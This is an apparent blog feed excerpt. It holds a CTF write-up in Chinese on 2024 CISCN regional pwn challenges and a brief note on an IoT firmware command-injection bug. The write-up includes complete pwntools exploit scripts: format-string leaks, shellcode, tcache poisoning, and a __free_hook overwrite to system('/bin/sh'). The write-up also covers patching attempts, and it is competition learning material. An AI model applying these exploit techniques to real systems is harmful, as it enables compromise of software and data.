(cnblogs.com)</a></p><p>主要漏洞利用在：利用fwrite函数控制$shell_file的值，如果向$shell_file中写入了由反引号包裹的命令，就能RCE绕过。</p><p>cigbin程序中的调用流程：buf_8 -&gt;xmldbc_ephp-&gt;FUN_0041420c -&gt;FUN_0041372c -&gt; socket</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272301792.png" alt="image-20240627230116665"></p><p>调用了GENA_subscribe_new()，定义在gena.php文件中  htdocs&#x2F;upnpinc下</p><p>这里也就是漏洞所在。。</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272304282.png" alt="image-20240627230435176"></p><p>从这开始，环境的构建将不依赖于dokcer环境，而是通过本地来模拟环境。</p><hr><p>ing。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;借着逆向课的作业，就借此机会来简单学习并复现iot固件漏洞。网上搜集资料找到了&lt;a href=&quot;https://github.com/Vu1nT0tal/IoT-vulhub&quot;&gt;Vu1nT0tal&amp;#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.c</summary>
      
    
    
    
    
    <category term="IOT" scheme="http://example.com/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>2024ciscn分区赛-pwn复现</title>
    <link href="http://example.com/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-06-25T10:23:13.000Z</published>
    <updated>2024-07-15T03:45:21.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024华东北分区赛-pwn复现"><a href="#2024华东北分区赛-pwn复现" class="headerlink" title="2024华东北分区赛-pwn复现"></a>2024华东北分区赛-pwn复现</h1><p>第一次打国赛，也是第一次打awdp（非正规）。赛后平台、题目都是非预期。竟然可以用fix来break，算是长见识了。这次比赛更多的是积累经验了。</p><p>8web 2pwn。两道题都通了，可是都没fix成功。</p><p>9.23访问平台地址，9.30靶机开始访问</p><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn-1"></a>pwn-1</h2><p>这题蛮可惜的，漏洞就是栈溢出+格式化字符串，花了40多分钟打通。一开始看到题目先想着fix了，没有先break。结果patch了6次都没过，到了10.45放弃fix这题，开始break。到13轮出了，最终吃了3w多分。当时应该先break再fix的，能多吃五六轮分，大概还能拿七八千分。</p><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>(<img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556142.png" alt="111"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251556611.png" alt="image-20240625153135803"></p><p>格式化字符串泄露栈地址以及canary，由于没开NX，栈上写shellcode，打ret2shellcode</p><p>shellcode写orw，open用openat代替</p><p>写shellcode的时候read从文件描述符3里面读了，导致本地成功泄露flag，远程没成功泄露，又花了好多时间排除shellcode的问题，最后从rax里面读，大概花了十分钟，又是一轮分。</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="comment">#1  --> stackoverflow</span><span class="comment">#2  --> fmt</span><span class="keyword">def</span> <span class="title function_">menu1</span>(<span class="params">payload</span>):    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(<span class="number">1</span>))    sla(<span class="string">b&#x27;->set name\n&#x27;</span>, payload)<span class="keyword">def</span> <span class="title function_">menu2</span>():    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(<span class="number">2</span>))<span class="keyword">def</span> <span class="title function_">getflag</span>():    sla(<span class="string">b&#x27;2: get name\n&#x27;</span> , <span class="built_in">str</span>(-<span class="number">1</span>))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;192.73.1.182 80&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    <span class="comment"># libc = ELF(libc_name)</span>    io = init(pwnfile, IPort, libc_name)    payload = <span class="string">b&#x27;%17$p--%18$p&#x27;</span>   <span class="comment">#-0x60 --> shellcode</span>    menu1(payload)    menu2()    ru(<span class="string">b&#x27;0x&#x27;</span>)    canary = <span class="built_in">int</span>(r(<span class="number">16</span>), <span class="number">16</span>)    ru(<span class="string">b&#x27;0x&#x27;</span>)    ori = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;   </span><span class="string">                    mov r14, 0x67616c66</span><span class="string">                    push r14</span><span class="string">                    mov rsi, rsp</span><span class="string">                    mov rdi, -100</span><span class="string">                    mov edx, 0</span><span class="string">                    mov rax, 257</span><span class="string">                    syscall               </span><span class="string">        </span><span class="string">                    mov rsi, rsp</span><span class="string">                    mov rdi, rax</span><span class="string">                    mov rdx, 0xff</span><span class="string">                    xor rax, rax</span><span class="string">                    syscall</span><span class="string"></span><span class="string">                    mov rsi, rsp</span><span class="string">                    mov rdi, 1</span><span class="string">                    mov rax, 1</span><span class="string">                    syscall</span><span class="string">                    &#x27;&#x27;&#x27;</span>)    payload = shellcode.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="number">0x0</span>) + p64(ori-<span class="number">0x60</span>)    <span class="comment"># debug(&#x27;b *$rebase(0x0001474) \n \</span>    <span class="comment">#       b *$rebase(0x0014A6)&#x27;)</span>    <span class="comment"># debug(&#x27;b *$rebase(0x014D7  )&#x27;)</span>    menu1(payload)    getflag()    leak(<span class="string">"canary"</span>, canary)    leak(<span class="string">"ori"</span>, ori)    itr()</code></pre><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>在10.45之前fix了6次，一直没成功，栈溢出改字节为0x48或者0x28</p><p>改printf为puts、添加“%s”，改printf调用前的跳转，都尝试过了，都没过check。尤其是改跳转，自己都不知道还能怎么打了，一直没check过。不排除对文件字节大小的check</p><p>patch脚本</p><pre class=" language-highlight python"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *binary = <span class="string">"./pwn"</span>awd_pwn_patcher = AwdPwnPatcher(binary)fmt_offset = awd_pwn_patcher.add_constant_in_ehframe(<span class="string">"%s\x00\x00"</span>)assembly = <span class="string">"""</span><span class="string">lea rax, [rbp-0x50]</span><span class="string">mov rsi, rax</span><span class="string">lea rdi, qword ptr [&#123;&#125;]</span><span class="string">"""</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(fmt_offset))awd_pwn_patcher.patch_by_jmp(<span class="number">0x14AB</span>, jmp_to=<span class="number">0x14B7</span>, assembly=assembly)assembly = <span class="string">&#x27;&#x27;&#x27;</span><span class="string">mov edx, 0x48</span><span class="string">&#x27;&#x27;&#x27;</span>awd_pwn_patcher.patch_origin(<span class="number">0x0147D</span>, end=<span class="number">0x01482</span>, assembly=assembly)awd_pwn_patcher.save()</code></pre><p>这样一直patch不过，看了<a href="https://blog.csdn.net/weixin_45906533/article/details/139937288">Ahisec</a>的wp，原来直接改栈权限就行了吗……吃了没经验的亏了</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251558233.png" alt="image-20240625154514962"></p><p>rwx改成rw就行了，7-&gt;6即可。</p><p>主要是光改这个也能绕过啊……打ROPgadget等等，格式化字符串和溢出都没改，还是能打的。这就是不给libc的正确解法吗……</p><p>实在不懂怎么check的。改了溢出、加了“%s”，我认为就算是没有开NX也打不了的，结果过不了check……</p><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn-2"></a>pwn-2</h2><p>静态 高版本编译</p><p>之前没有遇到过导入符号表还原符号的方法，比赛的时候边逆边调，碰巧题目不是特别难，硬是调出来了，程序都没逆完。可惜一直在弄pwn-1的patch，这题在14.40多break，最后只吃了6k多分</p><h3 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h3><p>逆向</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251609873.png" alt="image-20240625160948822"></p><p>逆的时候感觉chkflag很奇怪，里面貌似是使用了open读取flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612858.png" alt="image-20240625161209814"></p><p>调一调发现读取flag到了堆上</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251612341.png" alt="image-20240625161246286"></p><p>然后利用getflag的任意地址读能读到id地址为0x4efaf0上的flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251613318.png" alt="image-20240625161349274"></p><p>中间多加一步addflag来泄露堆地址，通过计算得到addflag得到的第一块chunk地址始终与flag的偏移为876</p><p>最后直接泄露</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):    sla(<span class="string">b&#x27;6: check flag\n&#x27;</span>,<span class="built_in">str</span>(num))<span class="keyword">def</span> <span class="title function_">add</span>():    menu(<span class="number">2</span>)<span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">info</span>):    menu(<span class="number">5</span>)    sla(<span class="string">b&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(info))<span class="keyword">def</span> <span class="title function_">openflag</span>():    menu(<span class="number">6</span>)<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    IPort = <span class="string">&#x27;192.73.1.80 80&#x27;</span>    pwnfile = <span class="string">&#x27;./heap&#x27;</span>    libc_name = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    <span class="comment"># libc = ELF(libc_name)</span>    io = init(pwnfile, IPort, libc_name)    add()    ru(<span class="string">b&#x27;:&#x27;</span>)    ori = <span class="built_in">int</span>(r(<span class="number">8</span>), <span class="number">10</span>)        openflag()    getflag(ori + <span class="number">876</span>)    <span class="comment"># system_addr, bin_sh = get_sysbin_local(&#x27;puts&#x27;, puts_addr)</span>    <span class="built_in">print</span>(<span class="string">"ori = "</span> + <span class="built_in">str</span>(ori))    <span class="comment"># debug(&#x27;b *0x00000000004020b2&#x27;)</span>    itr()<span class="comment">#0x4ef784</span></code></pre><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>漏洞太多不知道修什么了……好像还是人工测，太慢了</p><p>尝试了个将flag改为flaa，check过不了。原来不止看能不读到flag吗</p><p>最后是没patch成功。太菜了。。。</p><p><a href="https://zhuanlan.zhihu.com/p/705148718?utm_psn=178896319914142">Real返璞归真</a>这位师傅是nop掉了后门函数</p><p><a href="https://blog.csdn.net/weixin_45906533/article/details/139937288">Ahisec</a>是改了chkflag里面的参数</p><p>自己还是太菜了。。。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>当时没逆完的现在补补吧。</p><h4 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h4><p>先尝试<strong>恢复静态编译去符号的库函数名</strong>，题目的编译环境为22，估计靶机环境是2.34以上。</p><p><a href="(https://blog.csdn.net/Breeze_CAT/article/details/103788796)">IDA_flair</a>直接导入对应的sig文件，对应sig文件<a href="https://github.com/push0ebp/sig-database">push0ebp&#x2F;sig-database: IDA FLIRT Signature Database (github.com)</a>下载，里面最glibc最高为2.35，如果是再高点就需需要自己生成了。</p><p>导入成功</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251713761.png" alt="image-20240625171320497"></p><h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><p>lsflag遍历一遍chunk</p><p>addflag函数，从预分配的0x191大小的chunk中，分割出了12字节，前四字节写入size8，后8字节为data</p><p>qword_4E82F0里面保存着chunk的初始地址</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251714517.png" alt="image-20240625171441484"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251719512.png" alt="image-20240625171911393"></p><p>editflag函数</p><p>往v4地址里面写入v5，任意地址写</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251723956.png" alt="image-20240625172322905"></p><p>delflag函数</p><p>将data域置空</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251724645.png" alt="image-20240625172418594"></p><p>getflag函数</p><p>输出v8地址内的数据，v8可控，任意地址读</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251725678.png" alt="image-20240625172532626"></p><p>chkflag函数</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251726607.png" alt="image-20240625172616549"></p><p>读取flag前8字节取出，同时也会在堆上保存flag–&gt;非预期存在原因</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736037.png" alt="image-20240625173208267"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251736505.png" alt="image-20240625173355406"></p><p>接下来的sub_401D0F将取出来的8字节flag保存在0x4E60F0处</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739695.png" alt="image-20240625173911635"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251739567.png" alt="image-20240625173900469"></p><p>sub_401C51，将flag保存在了堆上</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251740443.png" alt="image-20240625174003363"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251744116.png" alt="image-20240625174209271"></p><p>然后是四次的循环加密</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251747486.png" alt="image-20240625174702436"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251745788.png" alt="image-20240625174530752"></p><p>过了这段chk后会打印flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251746139.png" alt="image-20240625174644089"></p><p>先申请出四块chunk用于存放加密后的flag，然后执行chkflag，将flag写入到0x4E60F0内，这时使用getflag取出0x4E60F0中加密过后的flag。再循环四次使用editflag往四块chunk中写入四段循环加密的flag，最后执行chkflag就能成功的过check，输出flag。</p><p>一个去了符号表的逻辑漏洞……洞有点多，check的点也是奇奇又怪怪。</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):    sla(<span class="string">b&#x27;6: check flag\n&#x27;</span>,<span class="built_in">str</span>(num))<span class="keyword">def</span> <span class="title function_">addflag</span>():    menu(<span class="number">2</span>)<span class="keyword">def</span> <span class="title function_">editflag</span>(<span class="params">target, value</span>):    menu(<span class="number">3</span>)    sl(<span class="built_in">str</span>(target) + <span class="built_in">str</span>(<span class="string">&#x27; &#x27;</span>) + <span class="built_in">str</span>(value))<span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">info</span>):    menu(<span class="number">5</span>)    sla(<span class="string">b&#x27;:\n&#x27;</span>, <span class="built_in">str</span>(info))<span class="keyword">def</span> <span class="title function_">chkflag</span>():    menu(<span class="number">6</span>)<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;192.73.1.80 80&#x27;</span>    pwnfile = <span class="string">&#x27;./heap&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    <span class="comment"># libc = ELF(libc_name)</span>    io = init(pwnfile, IPort, libc_name)    <span class="comment">#add_4_chunk</span>    addflag()    ru(<span class="string">b&#x27;:&#x27;</span>)    ori = <span class="built_in">int</span>(r(<span class="number">8</span>), <span class="number">10</span>)    addflag()    addflag()    addflag()    chkflag()    getflag(<span class="number">0x4e60f0</span>)    ru(<span class="string">b&#x27;::&#x27;</span>)    magic = <span class="built_in">int</span>(r(<span class="number">19</span>), <span class="number">10</span>)    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):        editflag(<span class="built_in">int</span>(ori + <span class="number">12</span>*i), <span class="built_in">int</span>(magic))        magic = (<span class="number">0x5851F42D4C957F2D</span> * magic + <span class="number">12345</span>) & <span class="number">0x7FFFFFFFFFFFFFFF</span>    chkflag()    <span class="built_in">print</span>(<span class="string">"ori = "</span> + <span class="built_in">str</span>(ori))    leak(<span class="string">"magic"</span>, magic)    <span class="comment"># debug(&#x27;b *0x00000000004020b2 \n \</span>    <span class="comment">#       tele 0x4E82F0 \n \</span>    <span class="comment">#       hex 0x4E60F0&#x27;)</span>    itr()</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251818976.png" alt="image-20240625181804898"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次国赛就这样过了，经验还是太少了，没想到pwn1改栈权限就行了。。。再接再厉吧。</p><p>awd类型的比赛以攻为主，防御为辅，毕竟都是刷ctf出来的，肯定是漏洞利用熟悉一点，再怎么样也会比瞎捣鼓patch好点。</p><p>链接参考：</p><p><a href="https://blog.csdn.net/weixin_45906533/article/details/139937288">https://blog.csdn.net/weixin_45906533/article/details/139937288</a></p><p><a href="https://zhuanlan.zhihu.com/p/705148718?utm_psn=1788963199141429250">2024全国大学生信息安全竞赛（ciscn）半决赛（华东北赛区）Pwn题解 - 知乎 (zhihu.com)</a></p><h1 id="华南"><a href="#华南" class="headerlink" title="华南"></a>华南</h1><p>一道堆题</p><h2 id="my-heap"><a href="#my-heap" class="headerlink" title="my_heap"></a>my_heap</h2><p>Ubuntu GLIBC 2.35-0ubuntu3.7</p><p>add：输入1能申请任意大小chunk，更新buf指向申请的chunk；非1只能malloc(0x4f0)，不更新buf</p><p>dele：uaf</p><p>show：打印buf-&gt;data 7字节，并且进行异或加密</p><p>edit：往buf里写8字节数据</p><p>getbackdoor：拿到程序基地址以及一次0x20字节写</p><blockquote><p>tcache机制  libc-2.26引入   Ubuntu-17.04以后</p><p>tcache_perthread_struct中存储着各个tcachebin结构体的counts以及bin表头，tcache_entry-&gt;next    </p><p>2.26下tcache不会检查链表完整性，double free</p><p>2.29增加了对size位的chk，需要进行size对齐    增加了链表遍历直接free两次失效，并且counts不能向下溢出</p><p>2.34+增加了PROTECT_PTR(pos, ptr)宏定义来将  ptr_addr&gt;&gt;12与ptr进行异或加密</p><p>tc free时会对e-&gt;key进行赋值，用于检测double free，将key破坏掉就能绕过double的chk</p><p>2.34+ 删除了dl_rtld_lock_recursiveh和dl_rtld_unlock_recursive   没有了malloc_hook等</p><p>getshell方法有：1.栈；2.vtable；3.tls_dtor_list挟持__exit_funcs链表（<a href="https://www.anquanke.com/post/id/243196#h2-2">exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)</a>）</p></blockquote><p>攻击思路：</p><ol><li>利用uaf泄露出libc_base和heap_base</li><li>利用getbackdoor来拿程序基地址，以及改写tcachebin_key，实现tcachebin doublefree，但是由于我们每次只能控制buf指向的chunk，所以无法得到两个以上的相同大小的tc来进行tb attack。需要先控制了tcache_perthread_struct结构体中的counts数组，对bin数目进行控制。由于我们只能写8字节，所以挟持到tcache_perthread_struct+0x10后可控0x20~0x50(8&#x2F;2)。然后修改1&lt;counts&lt;7（目的是防止后面的chunk free时被放入到fb中）</li><li>后面就是两次tcachebin attack：利用泄露出来的程序基地址来打buf，此时buf-&gt;buf，然后利用edit修改buf，此时将buf修改为了edit函数的返回地址，然后再利用edit函数修改返回地址为backdoor+8 或者 one_gadget</li></ol><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):    sla(<span class="string">b&#x27;magic heap has 4 choice : \nadd\ndelete\nshow\nedit\n&#x27;</span>,<span class="built_in">str</span>(num))<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx=<span class="number">1</span>, size=<span class="number">1</span></span>):    menu(<span class="number">1</span>)    sla(<span class="string">b&#x27;which one you choose?\n&#x27;</span>, <span class="built_in">str</span>(idx))    <span class="keyword">if</span> idx != <span class="number">5</span>:        sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))<span class="keyword">def</span> <span class="title function_">dele</span>():    menu(<span class="number">2</span>)<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content=<span class="string">b&#x27;aaaa&#x27;</span></span>):    menu(<span class="number">4</span>)    sa(<span class="string">b&#x27;edit data:&#x27;</span>, content)<span class="keyword">def</span> <span class="title function_">show</span>():    menu(<span class="number">3</span>)    ru(<span class="string">b&#x27;the data:&#x27;</span>)    enc = r(<span class="number">7</span>)    <span class="comment"># print(enc)</span>    <span class="comment"># for i in range(7):</span>    <span class="comment">#     enc[i] = enc[i] ^ (i + 153)</span>    <span class="comment"># print(enc)</span>    dec = [<span class="number">0</span>]*<span class="number">7</span>    j = <span class="number">0</span>    <span class="keyword">for</span> i <span class="keyword">in</span> enc:        dec[j] = i ^ (j+<span class="number">153</span>)        j += <span class="number">1</span>    <span class="keyword">return</span> uu64(<span class="built_in">bytes</span>(dec))                <span class="keyword">def</span> <span class="title function_">getBackdoor</span>():    menu(<span class="number">5</span>)<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    IPort = <span class="string">&#x27;1 1&#x27;</span>    pwnfile = <span class="string">&#x27;./my_heap&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    add(<span class="number">1</span>, <span class="number">0x418</span>)    add(<span class="number">5</span>)    dele()    libc_base = show() - <span class="number">0x21ace0</span>    add(<span class="number">1</span>, <span class="number">0x88</span>)    dele()  <span class="comment">#tb -> 1</span>    heap_addr = show()    heap_base = heap_addr << <span class="number">12</span>    getBackdoor()    ru(<span class="string">b&#x27;0x&#x27;</span>)    ori = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)    buf = ori - <span class="number">0x12be</span> + <span class="number">0x04040</span>    ru(<span class="string">b&#x27;edit data:&#x27;</span>)    s(p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>))  <span class="comment">#key_clean</span>    dele()   <span class="comment">#tb ->tcache_perthread ->1</span>    edit(p64(heap_base >><span class="number">12</span> ^(heap_base + <span class="number">0x10</span>)))    add(<span class="number">1</span>, <span class="number">0x88</span>)    add(<span class="number">1</span>, <span class="number">0x88</span>)    dele()    edit(p64(<span class="number">0</span>))        add(<span class="number">1</span>, <span class="number">0x38</span>)    dele()    add(<span class="number">1</span>, <span class="number">0x48</span>)    dele()    add(<span class="number">1</span>, <span class="number">0x288</span>)    dele()    edit(<span class="string">b&#x27;\x03\x03\x05\x00\x05\x00\x05\x00&#x27;</span>)  <span class="comment">#0x30->5  0x40->5  0x50->5</span>    add(<span class="number">1</span>, <span class="number">0x38</span>)    dele()    edit(p64((heap_base>><span class="number">12</span>)^(libc.sym[<span class="string">&#x27;environ&#x27;</span>] + libc_base)))    add(<span class="number">1</span>, <span class="number">0x38</span>)    add(<span class="number">1</span>, <span class="number">0x38</span>)    stack_addr = show()    ret_addr   = stack_addr - <span class="number">0x140</span>    add(<span class="number">1</span>, <span class="number">0x48</span>)    dele()    edit(p64((heap_base>><span class="number">12</span>) ^ (buf)))    add(<span class="number">1</span>, <span class="number">0x48</span>)    add(<span class="number">1</span>, <span class="number">0x48</span>)    edit(p64(ret_addr))    edit(p64(ori+<span class="number">8</span>))        leak(<span class="string">"libc_base"</span>, libc_base)    leak(<span class="string">"heap_base"</span>, heap_base)    leak(<span class="string">"stack_addr"</span>, stack_addr)    leak(<span class="string">"ret_addr"</span>, ret_addr)    leak(<span class="string">"backdoor_addr"</span>, ori)    leak(<span class="string">"buf"</span>, buf)    <span class="comment"># leak("info", info)</span>    <span class="comment"># debug(&#x27;tele $rebase(0x4040) \n \</span>    <span class="comment">#       b *$rebase(0x0x148d)&#x27;)</span>    itr()</code></pre><p>fix的话把uaf给patch掉，backdoor nop掉</p><h1 id="华中"><a href="#华中" class="headerlink" title="华中"></a>华中</h1><h2 id="pwn1-note"><a href="#pwn1-note" class="headerlink" title="pwn1-note"></a>pwn1-note</h2><p>2.31-0ubuntu9.9</p><p>add：size小于0xFFF</p><p>dele：uaf</p><p>edit、show正常</p><p>利用largechunk泄露libc，然后利用uaf改tcache链表为__free_hook</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):    sla(<span class="string">b&#x27;5. exit\n&#x27;</span>,<span class="built_in">str</span>(num))<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):    menu(<span class="number">1</span>)    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>,<span class="built_in">str</span>(size))    sla(<span class="string">b&#x27;content: \n&#x27;</span>, content)<span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):    menu(<span class="number">3</span>)    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):    menu(<span class="number">2</span>)    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>, <span class="built_in">str</span>(size))    sa(<span class="string">b&#x27;Content: \n&#x27;</span>, content)<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):    menu(<span class="number">4</span>)    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28278&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    add(<span class="number">0x418</span>)  <span class="comment">#0</span>    add(<span class="number">0x18</span>)   <span class="comment">#1</span>    dele(<span class="number">0</span>)    show(<span class="number">0</span>)    libc_base = uu64(r64()) - <span class="number">0x1ecbe0</span>    add(<span class="number">0x28</span>)  <span class="comment">#2</span>    add(<span class="number">0x28</span>)  <span class="comment">#3</span>    dele(<span class="number">3</span>)    dele(<span class="number">2</span>)    <span class="comment">#0x30: 2->3</span>    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))    add(<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment">#4</span>    add(<span class="number">0x28</span>)  <span class="comment">#5</span>    edit(<span class="number">5</span>, <span class="number">0x8</span>, p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))    dele(<span class="number">4</span>)    leak(<span class="string">"libc_base"</span>, libc_base)    <span class="comment"># debug(&#x27;tele $rebase(0x04060) \n \</span>    <span class="comment">#       tele $rebase(0x06060)&#x27;)</span>    itr()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024华东北分区赛-pwn复现&quot;&gt;&lt;a href=&quot;#2024华东北分区赛-pwn复现&quot; class=&quot;headerlink&quot; title=&quot;2024华东北分区赛-pwn复现&quot;&gt;&lt;/a&gt;2024华东北分区赛-pwn复现&lt;/h1&gt;&lt;p&gt;第一次打国赛，也是第一次打a</summary>
